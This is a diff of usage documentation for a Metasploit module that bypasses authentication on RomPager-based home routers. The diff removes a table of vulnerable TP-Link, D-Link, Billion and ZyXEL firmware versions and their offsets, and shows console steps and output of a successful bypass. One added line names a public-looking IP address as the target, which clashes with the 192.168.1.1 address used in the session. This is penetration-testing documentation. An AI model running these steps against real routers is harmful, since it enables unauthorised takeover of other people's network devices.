@@ -94,109 +94,14 @@ Following is list of devices and firmware versions with known values used for ex
   2. Do: ```use auxiliary/admin/http/allegro_rompager_auth_bypass```
   3. Do: ```set rhost <ip>```
   4. Do: ```set rport <port>```
-  5. Do: ```set device <device-id>```
-  6. Do: ```run```
-  7. You should be able to login into the device without authentication
+  5. Do: ```run```
+  6. You should be able to login into the device without authentication
   
 ## Scenarios
 
-  Example run against TP-Link TD-8840T with firmware V2_100525:
+  Example run against TP-Link TD-8817:
 ```
 msf > use auxiliary/admin/http/allegro_rompager_auth_bypass 
-msf auxiliary(allegro_rompager_auth_bypass) > devices
-
-List of vulnerable devices
-==========================
-
-   ID  Name     Model          Firmware                                    Number     Offset
-   --  ----     -----          --------                                    ------     ------
-   0   Azmoon   AZ-D140W       2.11.89.0(RE2.C29)3.11.11.52_PMOFF.1        107367693  13
-   1   Billion  BiPAC 5102S    Av2.7.0.23 (UE0.B1C)                        107369694  13
-   2   Billion  BiPAC 5102S    Bv2.7.0.23 (UE0.B1C)                        107369694  13
-   3   Billion  BiPAC 5200     2.11.84.0(UE2.C2)3.11.11.6                  107369545  9
-   4   Billion  BiPAC 5200     2_11_62_2_ UE0.C2D_3_10_16_0                107371218  21
-   5   Billion  BiPAC 5200A    2_10_5 _0(RE0.C2)3_6_0_0                    107366366  25
-   6   Billion  BiPAC 5200A    2_11_38_0 (RE0.C29)3_10_5_0                 107371453  9
-   7   Billion  BiPAC 5200GR4  2.11.91.0(RE2.C29)3.11.11.52                107367690  21
-   8   Billion  BiPAC 5200SRD  2.10.5.0 (UE0.C2C) 3.6.0.0                  107368270  1
-   9   Billion  BiPAC 5200SRD  2.12.17.0_UE2.C3_3.12.17.0                  107371378  37
-   10  Billion  BiPAC 5200SRD  2_11_62_2(UE0.C3D)3_11_11_22                107371218  13
-   11  D-Link   DSL-2520U      Z1 1.08 DSL-2520U_RT63261_Middle_East_ADSL  107368902  25
-   12  D-Link   DSL-2600U      Z1_DSL-2600U                                107366496  13
-   13  D-Link   DSL-2600U      Z2_V1.08_ras                                107360133  20
-   14  TP-Link  TD-8616        V2_080513                                   107371483  21
-   15  TP-Link  TD-8816        V4_100528_Russia                            107369790  17
-   16  TP-Link  TD-8816        V4_100524                                   107369790  17
-   17  TP-Link  TD-8816        V5_100528_Russia                            107369790  17
-   18  TP-Link  TD-8816        V5_100524                                   107369790  17
-   19  TP-Link  TD-8816        V5_100903                                   107369790  17
-   20  TP-Link  TD-8816        V6_100907                                   107371426  17
-   21  TP-Link  TD-8816        V7_111103                                   107371161  1
-   22  TP-Link  TD-8816        V7_130204                                   107370211  5
-   23  TP-Link  TD-8817        V5_100524                                   107369790  17
-   24  TP-Link  TD-8817        V5_100702_TR                                107369790  17
-   25  TP-Link  TD-8817        V5_100903                                   107369790  17
-   26  TP-Link  TD-8817        V6_100907                                   107369788  1
-   27  TP-Link  TD-8817        V6_101221                                   107369788  1
-   28  TP-Link  TD-8817        V7_110826                                   107369522  25
-   29  TP-Link  TD-8817        V7_130217                                   107369316  21
-   30  TP-Link  TD-8817        V7_120509                                   107369321  9
-   31  TP-Link  TD-8817        V8_140311                                   107351277  20
-   32  TP-Link  TD-8820        V3_091223                                   107369768  17
-   33  TP-Link  TD-8840T       V1_080520                                   107369845  5
-   34  TP-Link  TD-8840T       V2_100525                                   107369790  17
-   35  TP-Link  TD-8840T       V2_100702_TR                                107369790  17
-   36  TP-Link  TD-8840T       V2_090609                                   107369570  1
-   37  TP-Link  TD-8840T       V3_101208                                   107369766  17
-   38  TP-Link  TD-8840T       V3_110221                                   107369764  5
-   39  TP-Link  TD-8840T       V3_120531                                   107369688  17
-   40  TP-Link  TD-W8101G      V1_090107                                   107367772  37
-   41  TP-Link  TD-W8101G      V1_090107                                   107367808  21
-   42  TP-Link  TD-W8101G      V2_100819                                   107367751  21
-   43  TP-Link  TD-W8101G      V2_101015_TR                                107367749  13
-   44  TP-Link  TD-W8101G      V2_101101                                   107367749  13
-   45  TP-Link  TD-W8101G      V3_110119                                   107367765  25
-   46  TP-Link  TD-W8101G      V3_120213                                   107367052  25
-   47  TP-Link  TD-W8101G      V3_120604                                   107365835  1
-   48  TP-Link  TD-W8151N      V3_120530                                   107353867  24
-   49  TP-Link  TD-W8901G      V1_080522                                   107367787  21
-   50  TP-Link  TD-W8901G      V1,2_080522                                 107368013  5
-   51  TP-Link  TD-W8901G      V2_090113_Turkish                           107368013  5
-   52  TP-Link  TD-W8901G      V3_140512                                   107367854  9
-   53  TP-Link  TD-W8901G      V3_100603                                   107367751  21
-   54  TP-Link  TD-W8901G      V3_100702_TR                                107367751  21
-   55  TP-Link  TD-W8901G      V3_100901                                   107367749  13
-   56  TP-Link  TD-W8901G      V6_110119                                   107367765  25
-   57  TP-Link  TD-W8901G      V6_110915                                   107367682  21
-   58  TP-Link  TD-W8901G      V6_120418                                   107365835  1
-   59  TP-Link  TD-W8901G      V6_120213                                   107367052  25
-   60  TP-Link  TD-W8901GB     V3_100727                                   107367756  13
-   61  TP-Link  TD-W8901GB     V3_100820                                   107369393  21
-   62  TP-Link  TD-W8901N      V1_111211                                   107353880  0
-   63  TP-Link  TD-W8951ND     V1_101124,100723,100728                     107369839  25
-   64  TP-Link  TD-W8951ND     V1_110907                                   107369876  13
-   65  TP-Link  TD-W8951ND     V1_111125                                   107369876  13
-   66  TP-Link  TD-W8951ND     V3.0_110729_FI                              107366743  21
-   67  TP-Link  TD-W8951ND     V3_110721                                   107366743  21
-   68  TP-Link  TD-W8951ND     V3_20110729_FI                              107366743  21
-   69  TP-Link  TD-W8951ND     V4_120511                                   107364759  25
-   70  TP-Link  TD-W8951ND     V4_120607                                   107364759  13
-   71  TP-Link  TD-W8951ND     V4_120912_FL                                107364760  21
-   72  TP-Link  TD-W8961NB     V1_110107                                   107369844  17
-   73  TP-Link  TD-W8961NB     V1_110519                                   107369844  17
-   74  TP-Link  TD-W8961NB     V2_120319                                   107367629  21
-   75  TP-Link  TD-W8961NB     V2_120823                                   107366421  13
-   76  TP-Link  TD-W8961ND     V1_100722,101122                            107369839  25
-   77  TP-Link  TD-W8961ND     V1_101022_TR                                107369839  25
-   78  TP-Link  TD-W8961ND     V1_111125                                   107369876  13
-   79  TP-Link  TD-W8961ND     V2_120427                                   107364732  25
-   80  TP-Link  TD-W8961ND     V2_120710_UK                                107364771  37
-   81  TP-Link  TD-W8961ND     V2_120723_FI                                107364762  29
-   82  TP-Link  TD-W8961ND     V3_120524,120808                            107353880  0
-   83  TP-Link  TD-W8961ND     V3_120830                                   107353414  36
-   84  ZyXEL    P-660R-T3      3.40(BOQ.0)C0                               107369567  21
-   85  ZyXEL    P-660RU-T3     3.40(BJR.0)C0                               107369567  21
-
 msf auxiliary(allegro_rompager_auth_bypass) > show options
 
 Module options (auxiliary/admin/http/allegro_rompager_auth_bypass):
@@ -204,31 +109,20 @@ Module options (auxiliary/admin/http/allegro_rompager_auth_bypass):
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOST                       yes       The target address
+   RHOST      90.178.222.214   yes       The target address
    RPORT      80               yes       The target port
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /                yes       URI to test
    VHOST                       no        HTTP server virtual host
-   device                      yes       ID of device from list of vulnerable devices
+
 
 msf auxiliary(allegro_rompager_auth_bypass) > set rhost 192.168.1.1
 rhost => 192.168.1.1
-msf auxiliary(allegro_rompager_auth_bypass) > set device 33
-device => 33
 msf auxiliary(allegro_rompager_auth_bypass) > run
 
-[*] Device name: TP-Link
-[*] Device model: TD-8840T
-[*] Device firmware: V1_080520
-[-] Exploit failed
-[*] Auxiliary module execution completed
-msf auxiliary(allegro_rompager_auth_bypass) > set device 34
-device => 34
-msf auxiliary(allegro_rompager_auth_bypass) > run
-
-[*] Device name: TP-Link
-[*] Device model: TD-8840T
-[*] Device firmware: V2_100525
-[+] Exploit sent, please check host, authentication should be disabled
+[+] Detected device:TP-Link TD-8817
+[-] Bad response
+[-] Bad response
+[+] Good response, please check host, authentication should be disabled
 [*] Auxiliary module execution completed
 ```
